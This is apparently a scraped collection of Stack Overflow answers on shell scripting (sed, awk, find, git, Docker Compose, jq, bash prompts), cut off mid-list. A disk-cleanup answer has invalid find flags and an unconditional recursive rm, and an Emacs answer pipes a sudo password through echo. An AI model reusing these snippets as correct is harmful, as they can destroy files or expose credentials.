    "How can I detect that emacs-server is running from a shell prompt?": "You're making this too hard. From the the emacsclient(1) man page:\n-a, --alternate-editor=EDITOR if the Emacs server is not running, run the specified editor instead. This can also be specified via the `ALTERNATE_EDITOR' environment variable. If the value of EDITOR is the empty string, then Emacs is started in daemon mode and emacsclient will try to connect to it.",
    "Emulating a browser to download a file?": "First of all, if you are attempting any kind of scraping (yes this counts as scraping even though you are not necessarily parsing HTML), you have a certain amount of preliminary investigation to perform.\nIf you don't already have Firefox and Firebug, get them. Then if you don't already have Chrome, get it.\nStart up Firefox/Firebug, and Chrome, clear out all of your cookies/etc. Then open up Firebug, and in Chrome open up View->Developer->Developer Tools.\nThen load up the main page of the video you are trying to grab. Take notice of any cookies/headers/POST variables/query string variables that are being set when the page loads. You may want to save this info somewhere.\nThen try to download the video, once again, take notice of any cookies/headers/post variables/query string variables that are being set when the video is loaded. It is very likely that there was a cookie or POST variable set when you initially loaded the page, that is required to actually pull the video file.\nWhen you write your python, you are going to need to emulate this interaction as closely as possible. Use python-requests. This is probably the simplest URL library available, and unless you run into a wall somehow with it (something it can't do), I would never use anything else. The second I started using python-requests, all of my URL fetching code shrunk by a factor of 5x.\nNow, things are probably not going to work the first time you try them. Soooo, you will need to load the main page using python. Print out all of your cookies/headers/POST variables/query string variables, and compare them to what Chrome/Firebug had. Then try loading your video, once again, compare all of these values (that means what YOU sent the server, and what the SERVER sent you back as well). You will need to figure out what is different between them (don't worry, we ALL learned this one in Kindergarten... \"one of these things is not like the other\") and dissect how that difference is breaking stuff.\nIf at the end of all of this, you still can't figure it out, then you probably need to look at the HTML for the page that contains the link to the movie. Look for any javascript in the page. Then use Firebug/Chrome Developer Tools to inspect the javascript and see if it is doing some kind of management of your user session. If it is somehow generating tokens (cookies or POST/GET variables) related to video access, you will need to emulate its tokenizing method in python.\nHopefully all of this helps, and doesn't look too scary. The key is you are going to need to be a scientist. Figure out what you know, what you don't, what you want, and start experimenting and recording your results. Eventually a pattern will emerge.\nEdit: Clarify steps\nInvestigate how state is being maintained\nPull initial page with python, grab any state info you need from it\nPerform any tokenizing that may be required with that state info\nPull the video using the tokens from steps 2 and 3\nIf stuff blows up, output your request/response headers,cookies,query vars, post vars, and compare them to Chrome/Firebug\nReturn to step 1. until you find a solution\nEdit: You may also be getting redirected at either one of these requests (the html page or the file download). You will most likely miss the request/response in Firebug/Chrome if that is happening. The solution would be to use a sniffer like LiveHTTPHeaders, or like has been suggested by other responders, WireShark or Fiddler. Note that Fiddler will do you no good if you are on a Linux or OSX box. It is Windows only and is definitely focused on .NET development... (ugh). Wireshark is very useful but overkill for most problems, and depending on what machine you are running, you may have problems getting it working. So I would suggest LiveHTTPHeaders first.\nI love this kind of problem",
    "Export variables defined in another file": "There is a difference between a variable and an environment variable. If you execute . foo.sh and foo.sh contains the line FOO=value, then the variable FOO will be assigned in the current process. It is not an environment variable. To become an environment variable (and thus be available to sub-shells), it must be exported. However, shells provide an option which makes all variable assignments promote the variable to an environment variable, so if you simply do:\nset -a\n. foo.sh\nset +a\nthen all variable assignments in foo.sh will be made environment variables in the current process. Note that this is not strictly true: in bash, exporting a variable makes it an environement variable in the current shell, but in other shells (dash, for example) exporting the variable does not make it an environment variable in the current shell. (It does cause it to be set it in the environment of subshells, however.) However, in the context of the shell, it does not really matter if a variable is an environment variable in the current process. If it is exported (and therefore set in the environment of any sub-processes), a variable that is not in the environment is functionally equivalent to an environment variable.",
    "How to echo \"$x_$y\" in Bash script?": "Because variable names are allowed to have underscores in them, the command:\necho \"$x_$y\"\nis trying to echo ${x_} (which is probably empty in your case) followed by ${y}. The reason for this is because parameter expansion is a greedy operation - it will take as many legal characters as possible after the $ to form a variable name.\nThe relevant part of the bash manpage states:\nThe $ character introduces parameter expansion, command substitution, or arithmetic expansion.\nThe parameter name or symbol to be expanded may be enclosed in braces, which are optional but serve to protect the variable to be expanded from characters immediately following it which could be interpreted as part of the name.\nWhen braces are used, the matching ending brace is the first } not escaped by a backslash or within a quoted string, and not within an embedded arithmetic expansion, command substitution, or parameter expansion.\nHence, the solution is to ensure that the _ is not treated as part of the first variable, which can be done with:\necho \"${x}_${y}\"\nI tend to do all my bash variables like this, even standalone ones like:\necho \"${x}\"\nsince it's more explicit, and I've been bitten so many times in the past :-)",
    "Why is this bash prompt acting strangely/disappearing, and how do I fix it (OS X)?": "It sounds like this should solve your problem.\nThis seems to work for me*:\nexport PS1='--(\\[\\e[$((32-${?}))m\\]\\u\\[\\e[0m\\])-(\\[\\e[$((32-${?}))m\\]\\d\\[\\e[0m\\]|\\[\\e[$((32-${?}))m\\]\\T\\[\\e[0m\\])--(\\[\\e[$((32-${?}))m\\]\\w\\[\\e[0m\\] \\$ '\n* well, really export PS1='\\u@\\h:\\w\\$ ' works for me\nTo quote the linked post, the answer lies in adding \\[ and \\] around all of your color sequences in your PS1 declaration:\nBefore I had the following value for PS1:\n'\\e[0;34m\\h:\\w [!]\\$\\e[0m '\nwhich gave me a nice blue prompt of the following form\nhostname:working-directory [command-number]$\nHowever, I had the same line-wrapping problem you did. The fix was to insert \\[ and \\] around the ANSI escapes so that the shell knows not to include them in the line wrapping calculation. This results in the following value for PS1:\n'\\[\\e[0;34m\\]\\h:\\w [!]\\$\\[\\e[m\\] '",
    "How to grep for value in a key-value store from plain text": "Use a look behind:\n$ grep -Po '(?<=^FOO=)\\w*$' file\nfoo\nI also like awk for it:\n$ awk -v FS=\"FOO=\" 'NF>1{print $2}' file\nfoo\nOr even better:\n$ awk -F= -v key=\"FOO\" '$1==key {print $2}' file\nfoo\nWith sed:\n$ sed -n 's/^FOO=//p' file\nfoo\nOr even with Bash -ONLY if you are confident about the file not containing any weird values-, you can source the file and echo the required value:\n$ (source file; echo \"$FOO\")\nfoo",
    "KSH check if string starts with substring": "It's very simple but looks a bit odd:\nif [[ \"$foo\" == abc* ]]; then ...\nOne would assume that ksh would expand the pattern with the files in the current directory but instead, it does pattern matching. You need the [[, though. Single [ won't work. The quotes are not strictly necessary if there are no blanks in foo.",
    "Sed error : bad option in substitution expression": "This is because you are using a regex containing /, which is the same character sed uses as delimiter.\nJust change the sed delimiter to another one, for example ~:\nsed -i 's~^GPS_DEVICES=\"\".*~GPS_DEVICES=\"dev/ttyUSB1\"~' /etc/default/gpsd.default\nBy the way, since you are changing files in /etc, you may want to use -i.bak, so that the original file gets backed up. It is a good practice to prevent loss of important information.",
    "Homebrew in OS X 10.9.2: Error: SHA256 mismatch": "I had the same problem with MongoDb. I was able to fix it first I changed the permission to admin.\nThen I ran\nbrew cleanup && brew update\nAfter that I ran\nbrew install mongodb \nand it worked like a charm",
    "combine multiple text files and remove duplicates": "First off, you're not using the full power of cat. The loop can be replaced by just\ncat data/* > dnsFull\nassuming that file is initially empty.\nThen there's all those temporary files that force programs to wait for hard disks (commonly the slowest parts in modern computer systems). Use a pipeline:\ncat data/* | sort | uniq > dnsOut\nThis is still wasteful since sort alone can do what you're using cat and uniq for; the whole script can be replaced by\nsort -u data/* > dnsOut\nIf this is still not fast enough, then realize that sorting takes O(n lg n) time while deduplication can be done in linear time with Awk:\nawk '{if (!a[$0]++) print}' data/* > dnsOut",
    "how to check if a host is in your known_host ssh": "Try: ssh-keygen -F <hostname>\nWill show the known_hosts line(s) if the hostname fingerprint is found and the command returns 0, otherwise nothing is shown and the command returns 1.",
    "uniq - skipping last N characters/fields when comparing lines": "If you want the functionality of sorting first and then keeping only one line for each unique combination of the fields you are sorting on, you can make do with the unix utility sort alone.\nAs an example, consider the following file, named some_data\na;c;4\na;b;9\na;b;6\nWe want to sort by the first and second field, and leave the third field alone, so we do a stable sort, like this:\n$ sort -k1,1 -k2,2 -t';' --stable some_data\nwhich gives\na;b;9\na;b;6\na;c;4\nNow say we'd like to keep only unique combinations of the first and second column. Then we'd do this:\n$ sort -k1,1 -k2,2 -t';' --stable --unique some_data\nwhich gives\na;b;9\na;c;4",
    "git alias to delete local and remote": "You can make this work just fine. You just need to add a missing command name at the end of your definition. The command name will become $0 and everything after will get assigned to $1, $2, etc. In this case, I simply used - as the command name:\n[alias]\n     nuke = !sh -c 'git branch -D $1 && git push origin :$1' -\nFrom the command line, switch to another branch, then run the command:\ngit nuke branch-name\nAlternately\u2026 If you are unable to add the above to your .gitconfig file for some reason, but have access to the .bashrc, .bash_profile, etc\u2026 you can add the following:\ngit config --global alias.nuke '!sh -c \"git branch -D $1 && git push origin :$1\" -'\nYou can read more about sh and how it's expected to work here.",
    "check if a line is empty using bash": "You could also use the $? variable that is set to the return status of the command. So you'd have:\nline=$(grep mum test.txt)\nif [ $? -eq 1 ]\n    then\n    echo \"mum is not there\"\nfi\nFor the grep command if there are any matches $? is set to 0 (exited cleanly) and if there are no matches $? is 1.",
    "Split String in shell script while reading from file": "Try this :\n#!/bin/bash\n\nwhile IFS='=' read -r col1 col2\ndo \n    echo \"$col1\"\n    echo \"$col2\"\ndone <testprop.properties\nIFS is the Input Filed Separator.\nBut instead of parsing the file (like fedorqui said), you can source the file and accessing the variables directly:\nsource testprop.properties\necho \"$FNAME\"\nFrom $ LANG=C help source :\nsource: source filename [arguments]\nExecute commands from a file in the current shell.\n\nRead and execute commands from FILENAME in the current shell.  The\nentries in $PATH are used to find the directory containing FILENAME.\nIf any ARGUMENTS are supplied, they become the positional parameters\nwhen FILENAME is executed.\n\nExit Status:\nReturns the status of the last command executed in FILENAME; fails if\nFILENAME cannot be read.\nLast but not least, use more quotes !\nSee\nhttp://mywiki.wooledge.org/Quotes\nhttp://mywiki.wooledge.org/Arguments\nhttp://wiki.bash-hackers.org/syntax/words.",
    "bash \"map\" equivalent: run command on each file [duplicate]": "If you are just trying to execute your data program on a bunch of files, the easiest/least complicated way is to use -exec in find.\nSay you wanted to execute data on all txt files in the current directory (and subdirectories). This is all you'd need:\nfind . -name \"*.txt\" -exec data {} \\;\nIf you wanted to restrict it to the current directory, you could do this:\nfind . -maxdepth 1 -name \"*.txt\" -exec data {} \\;\nThere are lots of options with find.",
    "How to Merge Docker Compose file with Bash": "The Docker Compose config command does exactly what you need, it takes multiple compose file and merges them.\nJust pass them using multiple -f flags:\ndocker-compose -f docker-compose.yml -f docker-compose2.yml config\nor using an environment variable:\nCOMPOSE_FILE=docker-compose.yml:docker-compose2.yml docker-compose config\nThe same approach is valid for every Docker Compose command, so if your final target is, for example, to set up your project, you can directly run:\ndocker-compose -f docker-compose.yml -f docker-compose2.yml up\nCheck the documentation for further details on how to specify multiple compose files.",
    "Setting exports in Fish Shell": "In case you want to emulate the export command in your fish shell, just create the following file:\n~/.config/fish/functions/export.fish\nfunction export\n    if [ $argv ] \n        set var (echo $argv | cut -f1 -d=)\n        set val (echo $argv | cut -f2 -d=)\n        set -g -x $var $val\n    else\n        echo 'export var=value'\n    end\nend\nLaunch a new terminal and then run export from your fish shell as expected:\n> export foo=123\n> echo $foo\n123",
    "Add (collect) exit codes in bash": "A quick experiment and dip into bash info says:\ndeclare -i RESULT=$RESULT + $?\nsince you are adding to the result several times, you can use declare at the start, like this:\ndeclare -i RESULT=0\n\ntrue\nRESULT+=$?\nfalse\nRESULT+=$?\nfalse\nRESULT+=$?\n\necho $RESULT\n2\nwhich looks much cleaner.\ndeclare -i says that the variable is integer.\nAlternatively you can avoid declare and use arithmetic expression brackets:\nRESULT=$(($RESULT+$?))",
    "How to wait till a particular line appears in a file": "tail -n0 -f path_to_my_log_file.log | sed '/particular_line/ q'",
    "Specify which shell Yarn uses for running scripts": "yarn version 1.19 added support for a new config parameter script-shell. You can now do the following:\nyarn config set script-shell /bin/bash",
    "Run shell commands using C# and get the info into string [duplicate]": "You can redirect the output with ProcessStartInfo. There's examples on MSDN and SO.\nE.G.\nProcess proc = new Process {\n    StartInfo = new ProcessStartInfo {\n        FileName = \"program.exe\",\n        Arguments = \"command line arguments to your executable\",\n        UseShellExecute = false,\n        RedirectStandardOutput = true,\n        CreateNoWindow = true\n    }\n};\nthen start the process and read from it:\nproc.Start();\nwhile (!proc.StandardOutput.EndOfStream) {\n    string line = proc.StandardOutput.ReadLine();\n    // do something with line\n}\nDepending on what you are trying to accomplish you can achieve a lot more as well. I've written apps that asynchrously pass data to the command line and read from it as well. Such an example is not easily posted on a forum.",
    "Generating hex numbers of a certain range": "Another Attempt (still needs seq but not bc) - works in cygwin and linux:\nseq 0 255 | while read n; do printf \"%04X;\" $n; done\nThe inputs are decimal, but the output is capitalised hex and you can change the digits to show by updating the \"04\" part of the printf format string",
    "How to concat multiple fields to same line with jq [duplicate]": "Use @tsv to generated tab-separated values as output:\njq -r '[.user, .cmd] | @tsv' <yourfile\n...emits, given your input file:\nalex    echo '123'\njohn    echo '456'\nalex    echo '789'\n...though if you're filtering for only your user account, you can just print cmd directly, since the user value is known:\njq -r 'select(.user == \"alex\") | .cmd' ",
    "How to remove a word prefix using grep?": "You don't edit strings with grep in Unix shell, grep is usually used to find or remove some lines from the text. You'd rather use sed instead:\n$ echo www.example.com | sed 's/^[^\\.]\\+\\.//'\nexample.com\nYou'll need to learn regular expressions to use it effectively.\nSed can also edit file in-place (modify the file), if you pass -i argument, but be careful, you can easily lose data if you write the wrong sed command and use -i flag.\nAn example\nFrom your comments guess you have a TeX document, and your want to remove the first part of all .com domain names. If it is your document test.tex:\n\\documentclass{article}\n\\begin{document}\nwww.example.com\nexample.com www.another.domain.com\n\\end{document}\nthen you can transform it with this sed command (redirect output to file or edit in-place with -i):\n$ sed 's/\\([a-z0-9-]\\+\\.\\)\\(\\([a-z0-9-]\\+\\.\\)\\+com\\)/\\2/gi' test.tex \n\\documentclass{article}\n\\begin{document}\nexample.com\nexample.com another.domain.com\n\\end{document}\nPlease note that:\nA common sequence of allowed symbols followed by a dot is matched by [a-z0-9-]\\+\\.\nI used groups in the regular expression (parts of it within \\( and \\)) to indicate the first and the second part of the URL, and I replace the entire match with its second group (\\2 in the substitution pattern)\nThe domain should be at least 3rd level .com domain (every \\+ repition means at least one match)\nThe search is case insensitive (i flag in the end)\nIt can do more than match per line (g flag in the end)",
    "How to increment number in a file": "Sed needs forward slashes, not back slashes. There are multiple interesting issues with your use of '\\'s actually, but the quick fix should be (use double quotes too, as you see below):\noldnum=`cut -d ',' -f2 file1.txt`  \nnewnum=`expr $oldnum + 1`\nsed -i \"s/$oldnum\\$/$newnum/g\" file1.txt \nHowever, I question whether sed is really the right tool for the job in this case. A more complete single tool ranging from awk to perl to python might work better in the long run.\nNote that I used a $ end-of-line match to ensure you didn't replace 2012 with 2022, which I don't think you wanted.",
    "syntax error near unexpected token `echo'": "Put a ; in front of the do, or put the do on a new line.\nfor value in ${values[*]}; do\n  echo $value\ndone\nThe ; behind \"echo $value\" isn't needed except if you write the done directly behind it.",
    "Delete line from file at specified line number in bourne shell [duplicate]": "To delete line 5, do:\nsed -i '5d' file.txt\nFor a variable line number:\nsed -i \"${line}d\" file.txt\nIf the -i option isn't available in your flavor of sed, you can emulate it with a temp file:\nsed \"${line}d\" file.txt > file.tmp && mv file.tmp file.txt",
    "Read line by line from a variable in shell scripting": "Consider the following multi-line variable\nx=$(echo -e \"a\\nb\\nc d e\")\nand a simple process for each line: just echo it with a prefix=LINE: and with single quotes around the line. Either of the following codes will satisfy that requirement:\nwhile read line; do echo \"LINE: '${line}'\"; done <<< \"$x\"\nor\nwhile read line; do echo \"LINE: '${line}'\"; done < <(echo \"$x\")\nNeither creates a subshell (so you can, e.g., set variables in the loop and access them outside of it), and both output\nLINE: 'a'\nLINE: 'b'\nLINE: 'c d e'\nBut suppose instead you have\nx=$(echo -e \"a \\n b\\nc d e\")\n# note--------^--^\nand that leading and trailing whitespace matter for your application (e.g., parsing Git porcelain). Both the above codes will give exactly the same output for the latter variable/data as for the former, which is not what you want. To preserve leading and trailing whitespace, replace while read line with while IFS= read -r line . I.e., either of the following codes\nwhile IFS= read -r line; do echo \"LINE: '${line}'\"; done <<< \"$x\"\nor\nwhile IFS= read -r line; do echo \"LINE: '${line}'\"; done < <(echo \"$x\")\nwill produce\nLINE: 'a '\nLINE: ' b'\nLINE: 'c d e'\nSee Greg Wooledge's excellent Bash FAQ for details.",
    "How to compare two DateTime strings and return difference in hours? (bash shell)": "You could use date command to achieve this. man date will provide you with more details. A bash script could be something on these lines (seems to work fine on Ubuntu 10.04 bash 4.1.5):\n#!/bin/bash                                                                                                                                                   \n\n# Date 1\ndt1=\"2011-11-11 11:11:11\"\n# Compute the seconds since epoch for date 1\nt1=$(date --date=\"$dt1\" +%s)\n\n# Date 2 : Current date\ndt2=$(date +%Y-%m-%d\\ %H:%M:%S)\n# Compute the seconds since epoch for date 2\nt2=$(date --date=\"$dt2\" +%s)\n\n# Compute the difference in dates in seconds\nlet \"tDiff=$t2-$t1\"\n# Compute the approximate hour difference\nlet \"hDiff=$tDiff/3600\"\n\necho \"Approx hour diff b/w $dt1 & $dt2 = $hDiff\"\nHope this helps!",
    "How can I force PHP Version for Command Line?": "",
    "Passing arguments to Python from Shell Script": "If there is space in between argument and argument is not in quotes, then python consider as two different arguments.\nThat's why the output of print data in the python code is just 1.\nCheck the below output.\n[root@dsp-centos ~]# python dsp.py Dinesh Pundkar\nIn python code\nDinesh\n[root@dsp-centos ~]# python dsp.py \"Dinesh Pundkar\"\nIn python code\nDinesh Pundkar\n[root@dsp-centos ~]#\nSo, in your shell script, put $var1 in quotes.\nContent of shell script(a.sh):\nvar1=\"Dinesh Pundkar\"\npython dsp.py \"$var1\"\nContent of python code(dsp.py):\nimport sys\ndata = sys.argv[1]\nprint \"In python code\"\nprint data\nOutput:\n[root@dsp-centos ~]# sh a.sh\nIn python code\nDinesh Pundkar",
    "is cmd.exe a shell, a terminal emulator or both?": "The architecture of Linux and Windows is different. That's really it - you should not look for similarities when there are none.\nLinux is based on UNIX, which goes back to the days of dumb terminals. Graphics devices were highly specialised (and expensive), and uncommon. Most UNIX access was through character driven terminals (asynchronous at that).\nThere were many manufacturers of terminal devices. One of the most successful at that time was DEC (since taken-over by HP) who had a series of terminals used on their VAX computers: vt52 was the most basic, vt100, vt220, vt320 gave increasing functionality. Terminal emulators like putty emulate those. IBM, HP, and others all had their own devices as well.\nThe problem is that all these terminals were different, and had to be driven differently. So a database of terminal instructions was created, first called termcap and then terminfo. The database was accessed depending on the setting of the TERM environment variable, which is still used.\nIn comes graphics, specifically Xterm, and a terminal window. The database has control information for xterm, and the TERM variable is set accordingly.\nOf course Microsoft's Windows is a totally alien operating system so far as UNIX is concerned, so it has to pretend to be a UNIX terminal. That is what a terminal emulator like putty is. It will be pretending to be one of those ancient terminals that are nowadays only found in museums.\nSo, cmd.exe is not a terminal emulator because it is a Windows application running on a Windows machine. There is no need to emulate anything.\nIt is a shell, depending on your definition of what a shell is. Microsoft consider Windows Explorer to be a shell. In other words a shell is just a program that runs other programs. Most UNIX/Linux people would not call a GUI a shell, but that's just semantics.\ncmd.exe is a console program, and there are lots of those. For example telnet and python are both console programs. It means they have a console window, that's the monochrome rectangle you see. Some people think that is the same as cmd.exe (and even worse call it a \"DOS box\"), but it is not, it just uses the same console APIs. A Windows graphics program has a \"Main Window\" associated with it, but it can if it wishes create a console as well! They don't usually, but they can.\ncmd.exe scripts have .bat (or less common now .cmd) file extensions by default. But this file extension association is just a set of lookups in the Windows registry (HKEY_CLASSES_ROOT). There is no magic here, it is just like associating .doc with Microsoft Office Word, instead .bat is associated with cmd.exe.\nOne of the clever features of UNIX is the #! line on scripts. This can be used to run bash, ksh, sed, awk, perl, python, ruby, etc, etc. If you have more than one version of, say, python installed, then you just change the #! line to pickup the right one. No such flexibility on Windows, you can only associate one program at a time with a file extension.",
    "After using `exec 1>file`, how can I stop this redirection of the STDOUT to file and restore the normal operation of STDOUT?": "Q1\nYou have to prepare for the recovery before you do the initial exec:\nexec 3>&1 1>file\nTo recover the original standard output later:\nexec 1>&3 3>&-\nThe first exec copies the original file descriptor 1 (standard output) to file descriptor 3, then redirects standard output to the named file. The second exec copies file descriptor 3 to standard output again, and then closes file descriptor 3.\nQ2\nThis is a bit open ended. It can be described at a C code level or at the shell command line level.\nexec 1>file\nsimply redirects the standard output (1) of the shell to the named file. File descriptor one now references the named file; any output written to standard output will go to the file. (Note that prompts in an interactive shell are written to standard error, not standard output.)\nexec 1>&-\nsimply closes the standard output of the shell. Now there is no open file for standard output. Programs may get upset if they are run with no standard output.\nQ3\nIf you close all three of standard input, standard output and standard error, an interactive shell will exit as you close standard input (because it will get EOF when it reads the next command). A shell script will continue running, but programs that it runs may get upset because they're guaranteed 3 open file channels \u2014 standard input, standard output, standard error \u2014 and when your shell runs them, if there is no other I/O redirection, then they do not get the file channels they were promised and all hell may break loose (and the only way you'll know is that the exit status of the command will probably not be zero \u2014 success).",
    "Shell script to delete files when disk is full": "Just another proposal (comments within code):\nFILESYSTEM=/dev/sda1 # or whatever filesystem to monitor\nCAPACITY=95 # delete if FS is over 95% of usage \nCACHEDIR=/home/user/lotsa_cache_files/\n\n# Proceed if filesystem capacity is over than the value of CAPACITY (using df POSIX syntax)\n# using [ instead of [[ for better error handling.\nif [ $(df -P $FILESYSTEM | awk '{ gsub(\"%\",\"\"); capacity = $5 }; END { print capacity }') -gt $CAPACITY ]\nthen\n    # lets do some secure removal (if $CACHEDIR is empty or is not a directory find will exit\n    # with error which is quite safe for missruns.):\n    find \"$CACHEDIR\" --maxdepth 1 --type f -exec rm -f {} \\;\n    # remove \"maxdepth and type\" if you want to do a recursive removal of files and dirs\n    find \"$CACHEDIR\" -exec rm -f {} \\;\nfi \nCall the script from crontab to do scheduled cleanings",
    "How do I run a sudo command in Emacs?": "How about:\n(shell-command (concat \"echo \" (shell-quote-argument (read-passwd \"Password? \"))\n                       \" | sudo -S your_command_here\"))",
    "Are Bash and Linux shell the same?": "bash is one particular type of Linux shell (the Bourne again shell), but there are quite a few others. In Ubuntu, bash is the default. I am sure that there are numerous shell programming books that cover it, I've read one in the past.",
    "Check if string is UUID": "Your regular expression doesn't accept lowercase letters as valid. Here is a fixed version:\n#!/bin/bash\nuuid=\"7632f5ab-4bac-11e6-bcb7-0cc47a6c4dbd\"\nif [[ $uuid =~ ^\\{?[A-F0-9a-f]{8}-[A-F0-9a-f]{4}-[A-F0-9a-f]{4}-[A-F0-9a-f]{4}-[A-F0-9a-f]{12}\\}?$ ]]; then\n    echo \"true\"\nelse\n    echo \"false\"\nfi\nFirst of all, you only really need to be searching A-F not A-Z because UUIDs contain hex digits.\nNotice the addition of a-f in each character class. Your version will reject any UUID that is printed in lowercase. This new version works fine for me now. An alternative solution is to only use an uppercase UUID, instead of the lowercase one that you have. Your [A-Z0-9] classes have for those reasons been replaced with [A-F0-9a-f].\nSee the post by Ekeyme Mo for safety considerations.",
    "How to add file extensions based on file type on Linux/Unix?": "Here's mimetypes' version:\n#!/usr/bin/env python\n\"\"\"It is a `filename -> filename.ext` filter. \n\n   `ext` is mime-based.\n\n\"\"\"\nimport fileinput\nimport mimetypes\nimport os\nimport sys\nfrom subprocess import Popen, PIPE\n\nif len(sys.argv) > 1 and sys.argv[1] == '--rename':\n    do_rename = True\n    del sys.argv[1]\nelse:\n    do_rename = False    \n\nfor filename in (line.rstrip() for line in fileinput.input()):\n    output, _ = Popen(['file', '-bi', filename], stdout=PIPE).communicate()\n    mime = output.split(';', 1)[0].lower().strip()\n    ext = mimetypes.guess_extension(mime, strict=False)\n    if ext is None:\n        ext = os.path.extsep + 'undefined'\n    filename_ext = filename + ext\n    print filename_ext\n    if do_rename:\n       os.rename(filename, filename_ext)\nExample:\n$ ls *.file? | python add-ext.py --rename\navi.file.avi\ndjvu.file.undefined\ndoc.file.dot\ngif.file.gif\nhtml.file.html\nico.file.obj\njpg.file.jpe\nm3u.file.ksh\nmp3.file.mp3\nmpg.file.m1v\npdf.file.pdf\npdf.file2.pdf\npdf.file3.pdf\npng.file.png\ntar.bz2.file.undefined\nFollowing @Phil H's response that follows @csl' response:\n#!/usr/bin/env python\n\"\"\"It is a `filename -> filename.ext` filter. \n\n   `ext` is mime-based.\n\"\"\"\n# Mapping of mime-types to extensions is taken form here:\n# http://as3corelib.googlecode.com/svn/trunk/src/com/adobe/net/MimeTypeMap.as\nmime2exts_list = [\n    [\"application/andrew-inset\",\"ez\"],\n    [\"application/atom+xml\",\"atom\"],\n    [\"application/mac-binhex40\",\"hqx\"],\n    [\"application/mac-compactpro\",\"cpt\"],\n    [\"application/mathml+xml\",\"mathml\"],\n    [\"application/msword\",\"doc\"],\n    [\"application/octet-stream\",\"bin\",\"dms\",\"lha\",\"lzh\",\"exe\",\"class\",\"so\",\"dll\",\"dmg\"],\n    [\"application/oda\",\"oda\"],\n    [\"application/ogg\",\"ogg\"],\n    [\"application/pdf\",\"pdf\"],\n    [\"application/postscript\",\"ai\",\"eps\",\"ps\"],\n    [\"application/rdf+xml\",\"rdf\"],\n    [\"application/smil\",\"smi\",\"smil\"],\n    [\"application/srgs\",\"gram\"],\n    [\"application/srgs+xml\",\"grxml\"],\n    [\"application/vnd.adobe.apollo-application-installer-package+zip\",\"air\"],\n    [\"application/vnd.mif\",\"mif\"],\n    [\"application/vnd.mozilla.xul+xml\",\"xul\"],\n    [\"application/vnd.ms-excel\",\"xls\"],\n    [\"application/vnd.ms-powerpoint\",\"ppt\"],\n    [\"application/vnd.rn-realmedia\",\"rm\"],\n    [\"application/vnd.wap.wbxml\",\"wbxml\"],\n    [\"application/vnd.wap.wmlc\",\"wmlc\"],\n    [\"application/vnd.wap.wmlscriptc\",\"wmlsc\"],\n    [\"application/voicexml+xml\",\"vxml\"],\n    [\"application/x-bcpio\",\"bcpio\"],\n    [\"application/x-cdlink\",\"vcd\"],\n    [\"application/x-chess-pgn\",\"pgn\"],\n    [\"application/x-cpio\",\"cpio\"],\n    [\"application/x-csh\",\"csh\"],\n    [\"application/x-director\",\"dcr\",\"dir\",\"dxr\"],\n    [\"application/x-dvi\",\"dvi\"],\n    [\"application/x-futuresplash\",\"spl\"],\n    [\"application/x-gtar\",\"gtar\"],\n    [\"application/x-hdf\",\"hdf\"],\n    [\"application/x-javascript\",\"js\"],\n    [\"application/x-koan\",\"skp\",\"skd\",\"skt\",\"skm\"],\n    [\"application/x-latex\",\"latex\"],\n    [\"application/x-netcdf\",\"nc\",\"cdf\"],\n    [\"application/x-sh\",\"sh\"],\n    [\"application/x-shar\",\"shar\"],\n    [\"application/x-shockwave-flash\",\"swf\"],\n    [\"application/x-stuffit\",\"sit\"],\n    [\"application/x-sv4cpio\",\"sv4cpio\"],\n    [\"application/x-sv4crc\",\"sv4crc\"],\n    [\"application/x-tar\",\"tar\"],\n    [\"application/x-tcl\",\"tcl\"],\n    [\"application/x-tex\",\"tex\"],\n    [\"application/x-texinfo\",\"texinfo\",\"texi\"],\n    [\"application/x-troff\",\"t\",\"tr\",\"roff\"],\n    [\"application/x-troff-man\",\"man\"],\n    [\"application/x-troff-me\",\"me\"],\n    [\"application/x-troff-ms\",\"ms\"],\n    [\"application/x-ustar\",\"ustar\"],\n    [\"application/x-wais-source\",\"src\"],\n    [\"application/xhtml+xml\",\"xhtml\",\"xht\"],\n    [\"application/xml\",\"xml\",\"xsl\"],\n    [\"application/xml-dtd\",\"dtd\"],\n    [\"application/xslt+xml\",\"xslt\"],\n    [\"application/zip\",\"zip\"],\n    [\"audio/basic\",\"au\",\"snd\"],\n    [\"audio/midi\",\"mid\",\"midi\",\"kar\"],\n    [\"audio/mpeg\",\"mp3\",\"mpga\",\"mp2\"],\n    [\"audio/x-aiff\",\"aif\",\"aiff\",\"aifc\"],\n    [\"audio/x-mpegurl\",\"m3u\"],\n    [\"audio/x-pn-realaudio\",\"ram\",\"ra\"],\n    [\"audio/x-wav\",\"wav\"],\n    [\"chemical/x-pdb\",\"pdb\"],\n    [\"chemical/x-xyz\",\"xyz\"],\n    [\"image/bmp\",\"bmp\"],\n    [\"image/cgm\",\"cgm\"],\n    [\"image/gif\",\"gif\"],\n    [\"image/ief\",\"ief\"],\n    [\"image/jpeg\",\"jpg\",\"jpeg\",\"jpe\"],\n    [\"image/png\",\"png\"],\n    [\"image/svg+xml\",\"svg\"],\n    [\"image/tiff\",\"tiff\",\"tif\"],\n    [\"image/vnd.djvu\",\"djvu\",\"djv\"],\n    [\"image/vnd.wap.wbmp\",\"wbmp\"],\n    [\"image/x-cmu-raster\",\"ras\"],\n    [\"image/x-icon\",\"ico\"],\n    [\"image/x-portable-anymap\",\"pnm\"],\n    [\"image/x-portable-bitmap\",\"pbm\"],\n    [\"image/x-portable-graymap\",\"pgm\"],\n    [\"image/x-portable-pixmap\",\"ppm\"],\n    [\"image/x-rgb\",\"rgb\"],\n    [\"image/x-xbitmap\",\"xbm\"],\n    [\"image/x-xpixmap\",\"xpm\"],\n    [\"image/x-xwindowdump\",\"xwd\"],\n    [\"model/iges\",\"igs\",\"iges\"],\n    [\"model/mesh\",\"msh\",\"mesh\",\"silo\"],\n    [\"model/vrml\",\"wrl\",\"vrml\"],\n    [\"text/calendar\",\"ics\",\"ifb\"],\n    [\"text/css\",\"css\"],\n    [\"text/html\",\"html\",\"htm\"],\n    [\"text/plain\",\"txt\",\"asc\"],\n    [\"text/richtext\",\"rtx\"],\n    [\"text/rtf\",\"rtf\"],\n    [\"text/sgml\",\"sgml\",\"sgm\"],\n    [\"text/tab-separated-values\",\"tsv\"],\n    [\"text/vnd.wap.wml\",\"wml\"],\n    [\"text/vnd.wap.wmlscript\",\"wmls\"],\n    [\"text/x-setext\",\"etx\"],\n    [\"video/mpeg\",\"mpg\",\"mpeg\",\"mpe\"],\n    [\"video/quicktime\",\"mov\",\"qt\"],\n    [\"video/vnd.mpegurl\",\"m4u\",\"mxu\"],\n    [\"video/x-flv\",\"flv\"],\n    [\"video/x-msvideo\",\"avi\"],\n    